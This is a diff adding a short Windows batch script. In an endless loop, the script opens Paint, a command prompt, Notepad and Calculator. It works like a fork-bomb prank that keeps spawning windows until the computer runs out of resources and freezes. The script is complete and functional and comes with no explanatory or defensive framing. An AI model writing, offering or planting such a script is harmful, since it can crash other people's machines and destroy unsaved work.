@@ -1,0 +1,7 @@
+@echo off
+:a
+start mspaint
+start cmd
+start notepad
+start calc
+goto a
